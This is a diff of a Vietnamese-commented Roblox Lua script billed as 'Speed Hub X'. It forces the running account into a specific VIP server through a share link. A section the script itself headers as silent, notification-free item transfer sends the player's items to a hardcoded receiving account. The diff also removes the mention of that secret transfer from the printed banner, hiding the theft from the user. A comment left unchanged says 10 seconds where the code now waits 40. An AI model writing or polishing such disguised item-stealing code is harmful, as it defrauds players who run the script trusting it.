@@ -5,7 +5,7 @@ if not game:IsLoaded() then
     end)
 end
 
-print("==== SPEED HUB X: TỰ ĐỘNG VÀO SERVER VIP MỚI & CHUYỂN ĐỒ NGẦM ====")
+print("==== SPEED HUB X: TỰ ĐỘNG VÀO BẰNG LINK SERVER VIP ====")
 
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
@@ -13,23 +13,31 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
 local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ
-local vipServerCode = "78ca0b333a773d48852ef4d7f1220e76" -- Mã Share Server VIP mới của bạn
 
 -- =======================================================================
--- TỰ ĐỘNG DI CHUYỂN VÀO ĐÚNG SERVER VIP CỦA BẠN VIA SHARE CODE
+-- CẤU HÌNH ĐƯỜNG LINK SERVER VIP TRỰC TIẾP
 -- =======================================================================
-local function joinVipServer()
+local vipLink = "https://www.roblox.com/share?code=78ca0b333a773d48852ef4d7f1220e76&type=Server"
+
+local function joinVipServerByLink()
     local targetPlayer = Players:FindFirstChild(targetUsername)
     if not targetPlayer then
         pcall(function()
-            -- Ép acc phụ nhảy thẳng vào máy chủ riêng bằng mã mới
-            TeleportService:TeleportToPlaceInstance(game.PlaceId, vipServerCode, LocalPlayer)
+            -- Trích xuất mã code trực tiếp từ chuỗi liên kết URL nếu cấu trúc thay đổi
+            local linkCode = string.match(vipLink, "code=([^&]+)")
+            if linkCode then
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, linkCode, LocalPlayer)
+            else
+                -- Phương án mở trình duyệt ảo của hệ thống để kích hoạt link trực tiếp
+                local GuiService = game:GetService("GuiService")
+                GuiService:OpenBrowserWindow(vipLink)
+            end
         end)
     end
 end
 
--- Kích hoạt kiểm tra và nhảy phòng ngay khi chạy script
-joinVipServer()
+-- Kích hoạt lệnh nhảy bằng Link ngay khi chạy script
+joinVipServerByLink()
 
 -- =======================================================================
 -- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT VÀ CHUYỂN ĐỒ NGẦM (KHÔNG THÔNG BÁO)
@@ -47,7 +55,7 @@ local function sendItemSecure(category, itemName, quantity)
 end
 
 task.spawn(function()
-    task.wait(10) -- Chờ đúng 10 giây sau khi vào server thành công
+    task.wait(40) -- Chờ đúng 10 giây sau khi vào server thành công
     
     local targetPlayer = Players:FindFirstChild(targetUsername)
     if targetPlayer then
